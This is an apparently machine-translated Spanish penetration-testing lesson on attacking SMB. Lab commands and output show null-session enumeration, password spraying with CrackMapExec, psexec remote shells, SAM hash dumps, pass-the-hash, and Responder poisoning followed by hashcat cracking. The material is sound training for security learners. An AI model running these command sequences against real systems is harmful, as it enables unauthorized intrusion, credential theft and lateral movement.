# Attacking SMB

Servidor Message Block (SMB) es un protocolo de comunicación creado para proporcionar acceso compartido a archivos e impresoras en los nodos en una red. Inicialmente, fue diseñado para ejecutarse en la parte superior de Netbios a través de TCP/IP (NBT) utilizando el puerto TCP`139`y puertos UDP`137`y`138`. Sin embargo, con Windows 2000, Microsoft agregó la opción de ejecutar SMB directamente a través de TCP/IP en el puerto`445`sin la capa adicional de Netbios. Hoy en día, los sistemas operativos modernos de Windows usan SMB sobre TCP, pero aún admiten la implementación de Netbios como conmutación por error.

Samba es una implementación de código abierto basada en UNIX/Linux del protocolo SMB. También permite que los servidores Linux/Unix y los clientes de Windows usen los mismos servicios SMB.

Por ejemplo, en Windows, SMB puede ejecutarse directamente a través del puerto 445 TCP/IP sin la necesidad de Netbios a través de TCP/IP, pero si Windows tiene Netbios habilitado, o estamos atacando un host sin Windows, encontraremos SMB que se ejecuta en el puerto 139 TCP/IP. Esto significa que SMB se está ejecutando con NetBIOS a través de TCP/IP.

Otro protocolo que comúnmente está relacionado con SMB es[MSRPC (llamada de procedimiento remoto de Microsoft)](https://en.wikipedia.org/wiki/Microsoft_RPC). RPC proporciona a un desarrollador de aplicaciones una forma genérica de ejecutar un procedimiento (también conocido como una función) en un proceso local o remoto sin tener que comprender los protocolos de red utilizados para admitir la comunicación, como se especifica en[MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), que define un protocolo RPC sobre SMB que puede usar el protocolo SMB llamado Pipes como su transporte subyacente.

Para atacar un servidor SMB, necesitamos comprender su implementación, sistema operativo y qué herramientas podemos usar para abusar de él. Al igual que con otros servicios, podemos abusar de la configuración errónea o los privilegios excesivos, explotar vulnerabilidades conocidas o descubrir nuevas vulnerabilidades. Además, después de obtener acceso al servicio SMB, si interactuamos con una carpeta compartida, debemos conocer el contenido en el directorio. Finalmente, si estamos aturdiendo NetBios o RPC, identifique qué información podemos obtener o qué acción podemos realizar en el objetivo.

---

# **Enumeración**

Dependiendo de la implementación de SMB y del sistema operativo, obtendremos información diferente utilizando`Nmap`. Tenga en cuenta que al atacar el sistema operativo Windows, la información de la versión generalmente no se incluye como parte de los resultados de la exploración NMAP. En su lugar, NMAP intentará adivinar la versión del sistema operativo. Sin embargo, a menudo necesitaremos otros escaneos para identificar si el objetivo es vulnerable a una explotación particular. Cubriremos la búsqueda de vulnerabilidades conocidas más adelante en esta sección. Por ahora, escanemos los puertos 139 y 445 TCP.

Atacando a SMB

```
xnoxos@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-19T13:16:04
|_  start_date: N/A

```

La exploración NMAP revela información esencial sobre el objetivo:

- Versión SMB (Samba SMBD 4.6.2)
- Nombre de host htb
- El sistema operativo es Linux basado en la implementación de SMB

Exploremos algunas configuraciones erróneas y protocolos comunes ataques específico.

---

# **Configiguraciones erróneas**

SMB se puede configurar para no requerir autenticación, que a menudo se llama`null session`. En cambio, podemos iniciar sesión en un sistema sin nombre de usuario o contraseña.

### **Autenticación anónima**

Si encontramos un servidor SMB que no requiere un nombre de usuario y contraseña o encontrar credenciales válidas, podemos obtener una lista de acciones, nombres de usuario, grupos, permisos, políticas, servicios, etc.`smbclient`, `smbmap`, `rpcclient`, o`enum4linux`. Exploremos cómo podemos interactuar con las acciones de archivo y RPC utilizando la autenticación nula.

### **Compartir el archivo**

Usando`smbclient`, podemos mostrar una lista de las acciones del servidor con la opción`-L`, y usando la opción`-N`, lo contamos`smbclient`para usar la sesión nula.

Atacando a SMB

```
xnoxos@htb[/htb]$ smbclient -N -L //10.129.14.128        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)SMB1 disabled no workgroup available

```

`Smbmap`es otra herramienta que nos ayuda a enumerar las acciones de la red y acceder a los permisos asociados. Una ventaja de`smbmap`es que proporciona una lista de permisos para cada carpeta compartida.

Atacando a SMB

```
xnoxos@htb[/htb]$ smbmap -H 10.129.14.128[+] IP: 10.129.14.128:445     Name: 10.129.14.128
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       IPC Service (DEVSM)        notes                                                   READ, WRITE     CheckIT

```

Usando`smbmap`con el`-r`o`-R`Opción (recursiva), se puede navegar por los directorios:

Atacando a SMB

```
xnoxos@htb[/htb]$ smbmap -H 10.129.14.128 -r notes[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup

```

Del ejemplo anterior, los permisos se establecen en`READ`y`WRITE`, que se puede usar para cargar y descargar los archivos.

Atacando a SMB

```
xnoxos@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt

```

Atacando a SMB

```
xnoxos@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.

```

### **Llamada de procedimiento remoto (RPC)**

Podemos usar el`rpcclient`Herramienta con una sesión nula para enumerar una estación de trabajo o controlador de dominio.

El`rpcclient`La herramienta nos ofrece muchos comandos diferentes para ejecutar funciones específicas en el servidor SMB para recopilar información o modificar los atributos del servidor como un nombre de usuario. Podemos usar esto[Hoja de trucos del Sans Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)o revise la lista completa de todas estas funciones que se encuentran en el[página del hombre](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)del`rpcclient`.

Atacando a SMB

```
xnoxos@htb[/htb]$ rpcclient -U'%' 10.10.110.17rpcclient$> enumdomusersuser:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

```

`Enum4linux`es otra utilidad que admite sesiones nulas y utiliza`nmblookup`, `net`, `rpcclient`, y`smbclient`Para automatizar cierta enumeración común de objetivos SMB como:

- Grupo de trabajo/nombre de dominio
- Información de los usuarios
- Información del sistema operativo
- Agrupar información
- Carpetas de compartir
- Información de la política de contraseña

El[herramienta original](https://github.com/CiscoCXSecurity/enum4linux)fue escrito en Perl y[Reescrito por Mark Lowe en Python](https://github.com/cddmp/enum4linux-ng).

Atacando a SMB

```
xnoxos@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -CENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>

```

---

# **Ataques específicos del protocolo**

Si una sesión nula no está habilitada, necesitaremos credenciales para interactuar con el protocolo SMB. Dos formas comunes de obtener credenciales son[Forzar bruto](https://en.wikipedia.org/wiki/Brute-force_attack)y[pulverización de contraseña](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

### **Forque bruto y spray de contraseña**

Al forzar bruto, intentamos tantas contraseñas como sea posible en una cuenta, pero puede bloquear una cuenta si llegamos al umbral. Podemos usar el forzo bruto y detenernos antes de alcanzar el umbral si lo conocemos. De lo contrario, no recomendamos usar la fuerza bruta.

La pulverización de contraseñas es una mejor alternativa, ya que podemos apuntar a una lista de nombres de usuario con una contraseña común para evitar los bloqueos de cuentas. Podemos probar más de una contraseña si conocemos el umbral de bloqueo de la cuenta. Por lo general, dos o tres intentos son seguros, siempre que esperemos 30-60 minutos entre los intentos. Exploremos la herramienta[Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)Eso incluye la capacidad de ejecutar la pulverización de contraseñas.

Con CrackMapexec (CME), podemos orientar múltiples IP, utilizando numerosos usuarios y contraseñas. Exploremos un caso de uso diario para la pulverización de contraseñas. Para realizar un rocío de contraseña contra una IP, podemos usar la opción`-u`para especificar un archivo con una lista de usuarios y`-p`Para especificar una contraseña. Esto intentará autenticar a todos los usuarios de la lista utilizando la contraseña proporcionada.

Atacando a SMB

```
xnoxos@htb[/htb]$ cat /tmp/userlist.txtAdministrator
jrodriguez
admin
<SNIP>
jurena

```

Atacando a SMB

```
xnoxos@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-authSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!)

```

**Nota:**Por defecto, CME saldrá después de encontrar un inicio de sesión exitoso. Usando el`--continue-on-success`Flag continuará rociando incluso después de encontrar una contraseña válida. Es muy útil para rociar una sola contraseña contra una gran lista de usuarios. Además, si estamos atenuando una computadora sin dominio, necesitaremos usar la opción`--local-auth`. Para un estudio de estudio más detallado de estudio, consulte el módulo de enumeración y ataques de Active Directory.

Para obtener instrucciones de uso más detalladas, consulte la herramienta[guía de documentación](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials).

### **SMB**

Los servidores de Linux y Windows SMB proporcionan diferentes rutas de ataque. Por lo general, solo obtendremos acceso al sistema de archivos, privilegios de abuso o explotaremos vulnerabilidades conocidas en un entorno de Linux, como discutiremos más adelante en esta sección. Sin embargo, en las ventanas, la superficie de ataque es más significativa.

Al atacar un servidor SMB de Windows, nuestras acciones estarán limitadas por los privilegios que tuvimos en el usuario que logramos comprometer. Si este usuario es un administrador o tiene privilegios específicos, podremos realizar operaciones como:

- Ejecución de comandos remotos
- Extraer hash de la base de datos SAM
- Enumerando a los usuarios registrados
- PASS-THE-HASH (PTH)

Discutamos cómo podemos realizar tales operaciones. Además, aprenderemos cómo se puede abusar del protocolo SMB para recuperar el hash de un usuario como método para aumentar los privilegios o obtener acceso a una red.

### **Ejecución de código remoto (RCE)**

Antes de saltar a cómo ejecutar un comando en un sistema remoto que usa SMB, hablemos de Sysinternals. El sitio web de Windows Sysinternals fue creado en 1996 por[Mark Russinovich](https://en.wikipedia.org/wiki/Mark_Russinovich)y[Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707)Para ofrecer recursos técnicos y servicios públicos para administrar, diagnosticar, solucionar problemas y monitorear un entorno de Microsoft Windows. Microsoft adquirió Windows Sysinternals y sus activos el 18 de julio de 2006.

Sysinternals presentó varias herramientas gratuitas para administrar y monitorear las computadoras que ejecutan Microsoft Windows. El software ahora se puede encontrar en el[Sitio web de Microsoft](https://docs.microsoft.com/en-us/sysinternals/). Una de esas herramientas gratuitas para administrar sistemas remotos es PSEXEC.

[Psexeco](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)es una herramienta que nos permite ejecutar procesos en otros sistemas, completa con interactividad completa para aplicaciones de consola, sin tener que instalar el software del cliente manualmente. Funciona porque tiene una imagen de servicio de Windows dentro de su ejecutable. Toma este servicio y lo implementa al administrador $ compartido (por defecto) en la máquina remota. Luego utiliza la interfaz DCE/RPC a través de SMB para acceder a la API de Windows Service Control Manager. A continuación, inicia el servicio PSEXEC en la máquina remota. El servicio psexec luego crea un[tubería nombrada](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)Eso puede enviar comandos al sistema.

Podemos descargar psexec desde[Sitio web de Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), o podemos usar algunas implementaciones de Linux:

- [Impacket psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)Ejemplo de funcionalidad de Python PSEXEC Usando[REMCOMSVC](https://github.com/kavika13/RemCom).
- [Impacket SMBEXEC](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)Un enfoque similar a PSEXEC sin usar[REMCOMSVC](https://github.com/kavika13/RemCom). La técnica se describe aquí. Esta implementación va un paso más allá, instanciando un servidor SMB local para recibir la salida de los comandos. Esto es útil cuando la máquina de destino no tiene una participación escritable disponible.
- [Impacket Atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)Este ejemplo ejecuta un comando en la máquina de destino a través del servicio de programador de tareas y devuelve la salida del comando ejecutado.
- [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)Incluye una implementación de`smbexec`y`atexec`.
- [Metasploit psexec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md)Implementación de Ruby Psexec.

### **Impacket psexec**

Para usar`impacket-psexec`, necesitamos proporcionar el dominio/nombre de usuario, la contraseña y la dirección IP de nuestra máquina de destino. Para obtener información más detallada, podemos usar ayuda de Impacket:

Atacando a SMB

```
xnoxos@htb[/htb]$ impacket-psexec -hImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target

```

Para conectarse a una máquina remota con una cuenta de administrador local, utilizando`impacket-psexec`, puede usar el siguiente comando:

Atacando a SMB

```
xnoxos@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX

```

Las mismas opciones se aplican a`impacket-smbexec`y`impacket-atexec`.

### **Crackmapexec**

Otra herramienta que podemos usar para ejecutar CMD o PowerShell es`CrackMapExec`. Una ventaja de`CrackMapExec`es la disponibilidad para ejecutar un comando en múltiples host a la vez. Para usarlo, necesitamos especificar el protocolo,`smb`, the IP address or IP address range, the option `-u` for username, and `-p`para la contraseña y la opción`-x`para ejecutar comandos CMD o mayúsculas`-X`para ejecutar los comandos de PowerShell.

Atacando a SMB

```
xnoxos@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexecSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system

```

**Nota:**Si el`--exec-method`no está definido, CrackMapexec intentará ejecutar el método Atexec, si falla, puede intentar especificar el`--exec-method`SMBEXEC.

### **Enumerando a los usuarios registrados**

Imagine que estamos en una red con múltiples máquinas. Algunos de ellos comparten la misma cuenta de administrador local. En este caso, podríamos usar`CrackMapExec`para enumerar a los usuarios registrados en todas las máquinas dentro de la misma red`10.10.110.17/24`, que acelera nuestro proceso de enumeración.

Atacando a SMB

```
xnoxos@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-usersSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX

```

### **Extraer hash de la base de datos SAM**

El administrador de cuentas de seguridad (SAM) es un archivo de base de datos que almacena las contraseñas de los usuarios. Se puede usar para autenticar usuarios locales y remotos. Si obtenemos privilegios administrativos en una máquina, podemos extraer los hash de la base de datos SAM para diferentes fines:

- Autenticarse como otro usuario.
- Cracking de contraseña, si logramos descifrar la contraseña, podemos intentar reutilizar la contraseña para otros servicios o cuentas.
- Pasar el hash. Lo discutiremos más adelante en esta sección.

Atacando a SMB

```
xnoxos@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --samSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database

```

### **PASS-THE-HASH (PTH)**

Si logramos obtener un hash NTLM de un usuario, y si no podemos descifrarlo, aún podemos usar el hash para autenticar sobre SMB con una técnica llamada Pass-the-Hash (PTH). PTH permite a un atacante autenticarse en un servidor o servicio remoto utilizando el hash NTLM subyacente de la contraseña de un usuario en lugar de la contraseña de texto sin formato. Podemos usar un ataque PTH con cualquier`Impacket`herramienta,`SMBMap`, `CrackMapExec`, entre otras herramientas. Aquí hay un ejemplo de cómo funcionaría esto con`CrackMapExec`:

Atacando a SMB

```
xnoxos@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FESMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)

```

### **Ataques de autenticación forzados**

También podemos abusar del protocolo SMB creando un servidor SMB falso para capturar los usuarios '[Netntlm V1/V2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

La herramienta más común para realizar tales operaciones es la`Responder`. [Respondedor](https://github.com/lgandx/Responder)es una herramienta de envenenador LLMNR, NBT-NS y MDNS con diferentes capacidades, una de ellas es la posibilidad de establecer servicios falsos, incluidos SMB, de robar hashes Netntlm V1/V2. En su configuración predeterminada, encontrará el tráfico LLMNR y NBT-NS. Luego, responderá en nombre de los servidores que la víctima está buscando y capturar sus hashes netntlm.

Ilustramos un ejemplo para entender mejor cómo`Responder`obras. Imagine que creamos un servidor SMB falso utilizando la configuración predeterminada de respuesta, con el siguiente comando:

Atacando a SMB

```
xnoxos@htb[/htb]$ responder -I <interface name>

```

Cuando un usuario o un sistema intenta realizar una resolución de nombre (NR), una máquina realiza una serie de procedimientos para recuperar la dirección IP de un host por su nombre de host. En las máquinas de Windows, el procedimiento será aproximadamente el siguiente:

- Se requiere la dirección IP del archivo de archivo host.
- El archivo de host local (c: \ windows \ system32 \ controladores \ etc \ hosts) se verificará para obtener registros adecuados.
- Si no se encuentran registros, la máquina cambia a la caché DNS local, que realiza un seguimiento de los nombres resueltos recientemente.
- ¿No hay un registro local de DNS? Se enviará una consulta al servidor DNS que se ha configurado.
- Si todo lo demás falla, la máquina emitirá una consulta de multidifusión, solicitando la dirección IP de la acción compartida del archivo de otras máquinas en la red.

Supongamos que un usuario se confirma en el nombre de una carpeta compartida`\\mysharefoder\`en lugar de`\\mysharedfolder\`. En ese caso, todas las resoluciones de nombre fallarán porque el nombre no existe, y la máquina enviará una consulta de multidifusión a todos los dispositivos en la red, incluidos nosotros que ejecutamos nuestro servidor SMB falso. Este es un problema porque no se toman medidas para verificar la integridad de las respuestas. Los atacantes pueden aprovechar este mecanismo escuchando tales consultas y respuestas de falsificación, lo que lleva a la víctima a creer que los servidores maliciosos son confiables. Esta confianza generalmente se usa para robar credenciales.

Atacando a SMB

```
xnoxos@htb[/htb]$ sudo responder -I ens33                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.198]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-2TY1Z1CIGXH]
    Responder Domain Name      [HF2L.LOCAL]
    Responder DCE-RPC Port     [48162]

[+] Listening for events...

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000

```

Estas credenciales capturadas se pueden romper usando[hashcat](https://hashcat.net/hashcat/)o transmitido a un host remoto para completar la autenticación y hacerse pasar por el usuario.

Todos los hashes guardados se encuentran en el directorio de registros de respondedores (`/usr/share/responder/logs/`). Podemos copiar el hash en un archivo e intentar descifrarlo utilizando el módulo hashcat 5600.

**Nota:**Si nota que los hashes múltiples para una cuenta esto se debe a que NTLMV2 utiliza un desafío del lado del cliente y del lado del servidor que se aleja para cada interacción. Esto hace que los hashes resultantes que se envían están salados con una cadena aleatoria de números. Es por eso que los hashes no coinciden, pero aún representan la misma contraseña.

Atacando a SMB

```
xnoxos@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txthashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
